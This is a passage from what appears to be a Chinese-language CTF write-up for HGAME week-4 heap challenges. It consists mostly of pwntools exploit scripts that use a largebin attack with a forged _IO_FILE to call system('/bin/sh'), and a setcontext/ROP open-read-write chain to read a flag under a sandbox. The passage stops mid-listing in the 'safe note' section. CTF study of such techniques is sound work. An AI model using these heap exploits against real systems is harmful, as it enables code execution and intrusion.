<span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e4030</span><br>get_gadgets(libc_base)<br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = p64(leak) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xce0</span><br>fake_IO_addr = fake_IO_file_addr<br><br>fake_IO_file = flat(<br>    &#123;<br>        <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>        <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>        <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>        <span class="hljs-number">0x28</span>: system,<span class="hljs-comment"># gadget</span><br>        <span class="hljs-number">0x38</span>: fake_IO_addr + <span class="hljs-number">0xe8</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>        <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>        <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>        <span class="hljs-number">0x90</span>: _IO_wide_data_1,<span class="hljs-comment"># _IO_wide_data_2</span><br>        <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0xd0</span>: fake_IO_addr<span class="hljs-comment"># obstack(B)</span><br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>payload = fake_IO_file + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="note-content"><a href="#note-content" class="headerlink" title="note content"></a>note content</h3><p>跟上面的题一模一样，就是开了一个沙盒。</p><p>借助：一个特殊的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># &lt;getkeyserv_handle+576&gt;<br>mov rdx, qword ptr [rdi + 8]; <br>mov qword ptr [rsp], rax; <br>call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e4030</span><br>get_gadgets(libc_base)<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002858f</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002ac3f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x00000000001597d6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045580</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000611ea</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = p64(leak) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xce0</span><br>fake_IO_addr = fake_IO_file_addr<br>data = fake_IO_file_addr + <span class="hljs-number">0x380</span><br>flag_addr = fake_IO_file_addr + <span class="hljs-number">0x300</span><br><span class="hljs-comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </span><br>magic_gadget = libc_base + <span class="hljs-number">0x000000000014b760</span><br><br>fake_IO_file = flat(&#123;<br>    <span class="hljs-number">0</span>:&#123;<br>        <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>        <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>        <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>        <span class="hljs-number">0x28</span>: magic_gadget,<span class="hljs-comment"># gadget</span><br>        <span class="hljs-number">0x38</span>: fake_IO_file_addr + <span class="hljs-number">0x100</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>        <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>        <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>        <span class="hljs-number">0x90</span>: _IO_wide_data_1,<span class="hljs-comment"># _IO_wide_data_2</span><br>        <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0xd0</span>: fake_IO_addr<span class="hljs-comment"># obstack(B)</span><br>    &#125;, <br>    <span class="hljs-number">0xf0</span>:&#123;<br>        <span class="hljs-number">0</span>: [<br>            <span class="hljs-number">0</span>,<br>            fake_IO_file_addr + <span class="hljs-number">0x100</span>,<br>            <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>            setcontext + <span class="hljs-number">61</span><br>        ],<br>        <span class="hljs-number">0xa0</span>: fake_IO_file_addr + <span class="hljs-number">0x200</span>,<br>        <span class="hljs-number">0xa8</span>: ret<br>    &#125;,<br>    <span class="hljs-number">0x1f0</span>:<br>        [<br>            pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>            <span class="hljs-number">2</span>,<br>            pop_rdi_ret,<br>            flag_addr,<br>            pop_rsi_ret,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret,<br><br>            pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>            <span class="hljs-number">0</span>,<br>            pop_rdi_ret,<br>            <span class="hljs-number">3</span>,<br>            pop_rsi_ret,<br>            data,<br>            pop_rdx_rbx_ret,<br>            <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret,<br><br>            pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>            <span class="hljs-number">1</span>,<br>            pop_rdi_ret,<br>            <span class="hljs-number">1</span>,<br>            pop_rsi_ret,<br>            data,<br>            pop_rdx_rbx_ret,<br>            <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret<br>        ],<br>    <span class="hljs-number">0x2f0</span>: <span class="hljs-string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<br>&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>payload = fake_IO_file<br>edit(<span class="hljs-number">2</span>, payload)<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h3><p>白给的uaf。tcache bin attack覆盖free_hook为system。</p><p>需要注意的一点是，libc2.32及以上版本都对fd指针进行了异或加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span 